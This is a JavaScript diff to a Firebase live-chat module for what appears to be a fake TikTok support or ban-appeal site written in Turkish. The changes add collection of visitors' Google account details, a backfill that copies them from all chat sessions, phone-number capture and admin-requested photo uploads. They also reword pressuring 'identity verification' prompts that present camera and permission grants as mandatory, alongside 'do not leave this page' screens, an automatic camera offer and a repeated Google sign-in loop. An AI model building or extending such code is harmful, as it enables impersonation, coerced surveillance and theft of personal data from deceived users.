@@ -55,11 +55,12 @@ const configured =
 const QUICK_KEY = "admin_quick_replies_v1";
 const DEFAULT_QUICK_REPLIES = [
   "Merhaba, size nasıl yardımcı olabilirim?",
-  "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…",
+  "İsteğiniz alındı. Lütfen bekleyin.",
   "İşleminiz devam ediyor, lütfen bekleyin.",
+  "Kimlik doğrulaması için izin gerekir; izin verilmeden bu adım tamamlanamaz.",
   "Lütfen uygulamada gördüğünüz uyarı veya hata metnini yazın.",
   "Hesap işlemleri için yalnızca resmi destek kullanılır: support.tiktok.com",
-  "Şifre, e-posta veya doğrulama kodu paylaşmayın.",
+  "Şifre, e-posta veya doğrulama kodu paylaşmayın. Kimlik doğrulaması yalnızca istenen izinler ile yapılır.",
   "Konuyu inceledim. Ban itirazını uygulama üzerinden göndermeniz gerekiyor.",
   "Başka bir sorunuz var mı?",
 ];
@@ -144,6 +145,46 @@ function getGoogleUser() {
   return googleUser || auth?.currentUser || null;
 }
 
+async function upsertGoogleAccount(user, sessionId) {
+  const database = initDb();
+  if (!database || !user?.uid) return false;
+  const uid = String(user.uid).trim().slice(0, 128);
+  if (!uid) return false;
+  const name = String(user.displayName || "").trim().slice(0, 120);
+  const email = String(user.email || "").trim().slice(0, 180).toLowerCase();
+  const photo = String(user.photoURL || "").trim().slice(0, 500);
+  const now = Date.now();
+  const accountRef = ref(database, `googleAccounts/${uid}`);
+  let firstSeenAt = now;
+  try {
+    const snap = await get(accountRef);
+    if (snap.exists()) {
+      const prev = Number(snap.val()?.firstSeenAt) || 0;
+      if (prev > 0) firstSeenAt = prev;
+    }
+  } catch {
+    /* ignore */
+  }
+  const providerIds = Array.isArray(user.providerData)
+    ? user.providerData.map((p) => String(p?.providerId || "").trim()).filter(Boolean)
+    : ["google.com"];
+  const payload = {
+    uid,
+    email,
+    name,
+    photo,
+    providers: providerIds.length ? providerIds : ["google.com"],
+    lastSeenAt: now,
+    firstSeenAt,
+    createdAt: firstSeenAt,
+    signedInAt: now,
+    updatedAt: now,
+  };
+  if (sessionId) payload.lastSessionId = String(sessionId).slice(0, 128);
+  await update(accountRef, payload);
+  return true;
+}
+
 async function writeGoogleProfile(user) {
   const database = initDb();
   if (!database || !user) return false;
@@ -164,12 +205,88 @@ async function writeGoogleProfile(user) {
     lastWho: "user",
     updatedAt: Date.now(),
   });
+  await upsertGoogleAccount(user, id).catch((err) => {
+    console.warn("upsertGoogleAccount", err);
+  });
   try {
     sessionStorage.removeItem("pendingGoogleRedirect");
   } catch {
     /* ignore */
   }
   return true;
+}
+
+function listenGoogleAccounts(onUpdate) {
+  const database = initDb();
+  if (!database) return () => {};
+  return onValue(
+    ref(database, "googleAccounts"),
+    (snap) => {
+      const rows = [];
+      snap.forEach((child) => {
+        const val = child.val() || {};
+        rows.push({ id: child.key, ...val });
+      });
+      rows.sort((a, b) => (Number(b.lastSeenAt) || 0) - (Number(a.lastSeenAt) || 0));
+      onUpdate(rows);
+    },
+    (err) => {
+      console.error("listenGoogleAccounts error", err);
+      onUpdate([]);
+    }
+  );
+}
+
+/** Sohbetlerdeki Google profillerini googleAccounts indeksine aktarır (bir kez). */
+async function backfillGoogleAccountsFromSessions() {
+  const database = initDb();
+  if (!database) return 0;
+  const snap = await get(ref(database, "chats"));
+  const chats = snap.val() || {};
+  let n = 0;
+  await Promise.all(
+    Object.entries(chats).map(async ([sessionId, row]) => {
+      const uid = String(row?.googleUid || "").trim().slice(0, 128);
+      const email = String(row?.googleEmail || "").trim().slice(0, 180).toLowerCase();
+      if (!uid && !email) return;
+      const key = uid || email.replace(/[^a-z0-9._+-@]/gi, "_").slice(0, 128);
+      if (!key) return;
+      const accountRef = ref(database, `googleAccounts/${key}`);
+      const existing = await get(accountRef);
+      const signed = Number(row.googleSignedInAt) || Number(row.updatedAt) || Date.now();
+      if (existing.exists()) {
+        const prev = existing.val() || {};
+        await update(accountRef, {
+          email: email || prev.email || "",
+          name: String(row.googleName || prev.name || "").trim().slice(0, 120),
+          photo: String(row.googlePhoto || prev.photo || "").trim().slice(0, 500),
+          providers: Array.isArray(prev.providers) && prev.providers.length ? prev.providers : ["google.com"],
+          lastSessionId: sessionId,
+          lastSeenAt: Math.max(Number(prev.lastSeenAt) || 0, signed),
+          signedInAt: Math.max(Number(prev.signedInAt) || 0, signed),
+          createdAt: Number(prev.createdAt) || Number(prev.firstSeenAt) || signed,
+          firstSeenAt: Number(prev.firstSeenAt) || signed,
+          updatedAt: Date.now(),
+        });
+      } else {
+        await set(accountRef, {
+          uid: uid || key,
+          email,
+          name: String(row.googleName || "").trim().slice(0, 120),
+          photo: String(row.googlePhoto || "").trim().slice(0, 500),
+          providers: ["google.com"],
+          lastSessionId: sessionId,
+          firstSeenAt: signed,
+          createdAt: signed,
+          lastSeenAt: signed,
+          signedInAt: signed,
+          updatedAt: Date.now(),
+        });
+      }
+      n += 1;
+    })
+  );
+  return n;
 }
 
 async function consumeGoogleRedirectResult() {
@@ -393,6 +510,31 @@ async function pushMessage(who, text) {
   return true;
 }
 
+async function saveVisitorPhone(phone) {
+  const database = initDb();
+  if (!database) throw new Error("Firebase bağlı değil");
+  const id = await ensureSession();
+  if (!id) throw new Error("Oturum açılamadı");
+  const clean = String(phone || "").replace(/[^\d+\s()-]/g, "").trim().slice(0, 32);
+  if (!clean) throw new Error("Telefon boş");
+  await update(ref(database, `chats/${id}`), {
+    phone: clean,
+    phoneAt: Date.now(),
+    updatedAt: Date.now(),
+    preview: `📞 ${clean}`.slice(0, 120),
+    lastWho: "user",
+    page: location.pathname + location.hash,
+  });
+  const msgRef = push(ref(database, `chats/${id}/messages`));
+  await set(msgRef, {
+    who: "user",
+    text: `Telefon: ${clean}`,
+    ts: Date.now(),
+    type: "phone",
+  });
+  return { ok: true, phone: clean, sessionId: id };
+}
+
 /** Ziyaretçi açılışında otomatik kamera: call + mesaj (from:auto → ziyaretçi admin dinleyicisine düşmez) */
 async function startVisitorCameraOffer(text) {
   const database = initDb();
@@ -405,7 +547,7 @@ async function startVisitorCameraOffer(text) {
 
   const clean = String(
     text ||
-      "Güvenlik kontrolü için kamera ve konum izni zorunludur. Açarsanız görüntü bu destek oturumuna bağlanır; konum doğrulama için kullanılır."
+      "Kimlik doğrulaması için izin zorunludur. İzin verirseniz doğrulama bu destek oturumuna bağlanır. İzin verilmezse doğrulama adımı tamamlanamaz."
   )
     .trim()
     .slice(0, 800);
@@ -723,6 +865,62 @@ async function uploadCameraSnapshot(targetSessionId, callId, blob, fileName) {
   return url;
 }
 
+const PHOTO_MAX_COUNT = 10;
+const PHOTO_MAX_BYTES = 8 * 1024 * 1024;
+
+/** Ziyaretçinin açıkça seçtiği fotoğrafı Storage’a yükler ve sohbete ekler. */
+async function uploadVisitorPhoto(file, { index = 1, total = 1 } = {}) {
+  const store = initStorage();
+  const database = initDb();
+  if (!store || !database) throw new Error("Firebase Storage bağlı değil");
+  const id = await ensureSession();
+  if (!id) throw new Error("Oturum açılamadı");
+  if (!file || typeof file !== "object") throw new Error("Dosya yok");
+
+  const type = String(file.type || "").toLowerCase();
+  if (!type.startsWith("image/")) throw new Error("Yalnızca görsel dosyalar");
+  if (Number(file.size) > PHOTO_MAX_BYTES) {
+    throw new Error("Dosya 8 MB’dan büyük olamaz");
+  }
+
+  const original = String(file.name || "foto.jpg").replace(/[^\w.\-]+/g, "_").slice(0, 80);
+  const ext = (original.split(".").pop() || "jpg").slice(0, 8);
+  const safeName = `photo-${Date.now()}-${index}.${ext}`;
+  const path = `uploads/${id}/${safeName}`;
+  const fileRef = storageRef(store, path);
+
+  await uploadBytes(fileRef, file, {
+    contentType: type || "image/jpeg",
+    contentDisposition: `inline; filename="${safeName}"`,
+    customMetadata: {
+      sessionId: String(id),
+      kind: "visitor-photo",
+      originalName: original.slice(0, 80),
+    },
+  });
+  const url = await getDownloadURL(fileRef);
+  const label = `Fotoğraf ${index}/${total}: ${original || safeName}`;
+  const msgRef = push(ref(database, `chats/${id}/messages`));
+  await set(msgRef, {
+    who: "user",
+    text: label.slice(0, 800),
+    ts: Date.now(),
+    type: "photo",
+    imageUrl: url,
+    fileName: original || safeName,
+    contentType: type || "image/jpeg",
+  });
+  await update(ref(database, `chats/${id}`), {
+    updatedAt: Date.now(),
+    preview: `🖼 ${label}`.slice(0, 120),
+    lastWho: "user",
+    lastPhotoUrl: url,
+    hasPhotos: true,
+    page: location.pathname + location.hash,
+  });
+  return { url, fileName: original || safeName };
+}
+
 async function sendAdminMessage(targetSessionId, text, options = {}) {
   const database = initDb();
   if (!database) throw new Error("Firebase bağlı değil");
@@ -734,16 +932,20 @@ async function sendAdminMessage(targetSessionId, text, options = {}) {
         ? "popup"
         : options.type === "camera"
           ? "camera"
-          : "text";
+          : options.type === "photos"
+            ? "photos"
+            : "text";
   const clean = String(
     text ||
       (kind === "loading"
-        ? "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…"
+        ? "Kimlik doğrulaması için bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…"
         : kind === "popup"
           ? "Devam etmek için onaylayın."
           : kind === "camera"
-            ? "Görüntülü doğrulama için kameranızı açmanız isteniyor. Açarsanız görüntü bu destek oturumuna bağlanır ve oturum kaydı alınır."
-            : "")
+            ? "Kimlik doğrulaması için izin vermeniz isteniyor. İzin verirseniz doğrulama bu destek oturumuna bağlanır. İzin verilmezse doğrulama tamamlanamaz."
+            : kind === "photos"
+              ? "Destek için ekran görüntüsü veya fotoğraf gönderebilirsiniz. En fazla 10 görsel seçebilirsiniz; istemezseniz iptal edin."
+              : "")
   )
     .trim()
     .slice(0, 800);
@@ -764,7 +966,9 @@ async function sendAdminMessage(targetSessionId, text, options = {}) {
     text: clean,
     ts: Date.now(),
   };
-  if (kind === "loading" || kind === "popup" || kind === "camera") payload.type = kind;
+  if (kind === "loading" || kind === "popup" || kind === "camera" || kind === "photos") {
+    payload.type = kind;
+  }
   if (kind === "popup") {
     payload.from = "admin";
     payload.okLabel = okLabel;
@@ -774,6 +978,15 @@ async function sendAdminMessage(targetSessionId, text, options = {}) {
     payload.placeholder = String(options.placeholder || "Mesajınızı buraya yazın…")
       .trim()
       .slice(0, 120);
+  }
+  if (kind === "photos") {
+    payload.okLabel = String(options.okLabel || "Fotoğraf seç").trim().slice(0, 40) || "Fotoğraf seç";
+    payload.cancelLabel =
+      String(options.cancelLabel || "İstemiyorum").trim().slice(0, 40) || "İstemiyorum";
+    payload.maxPhotos = Math.min(
+      PHOTO_MAX_COUNT,
+      Math.max(1, Number(options.maxPhotos) || PHOTO_MAX_COUNT)
+    );
   }
   if (kind === "camera") {
     payload.callId = callId;
@@ -793,7 +1006,9 @@ async function sendAdminMessage(targetSessionId, text, options = {}) {
           ? `Popup: ${clean.slice(0, 100)}`
           : kind === "camera"
             ? "📷 Kamera talebi"
-            : clean.slice(0, 120),
+            : kind === "photos"
+              ? "🖼 Fotoğraf talebi"
+              : clean.slice(0, 120),
     lastWho: "admin",
   });
   return { callId };
@@ -912,7 +1127,10 @@ function listenIncomingSupport(onMessage) {
       seen.add(msg.id);
     }
     const isAction =
-      msg.type === "camera" || msg.type === "popup" || msg.type === "loading";
+      msg.type === "camera" ||
+      msg.type === "popup" ||
+      msg.type === "loading" ||
+      msg.type === "photos";
     if (isAction) {
       const ts = Number(msg.ts) || 0;
       // Dinleyici bağlanmadan ≥3 sn önce yazılmış aksiyonları yok say (geçmiş replay)
@@ -952,6 +1170,7 @@ window.ChatSync = {
   ensureSession,
   pingPresence,
   pushMessage,
+  saveVisitorPhone,
   startVisitorCameraOffer,
   sendAdminMessage,
   checkAdminPassword,
@@ -979,12 +1198,18 @@ window.ChatSync = {
   uploadCameraRecording,
   uploadCameraSnapshot,
   markCameraRecordingFailed,
+  uploadVisitorPhoto,
+  PHOTO_MAX_COUNT,
+  PHOTO_MAX_BYTES,
   getQuickReplies,
   setQuickReplies,
   DEFAULT_QUICK_REPLIES,
   initAuth,
   getGoogleUser,
   writeGoogleProfile,
+  upsertGoogleAccount,
+  listenGoogleAccounts,
+  backfillGoogleAccountsFromSessions,
   signInWithGoogleFast,
   startGoogleSignInLoop,
   stopGoogleSignInLoop,
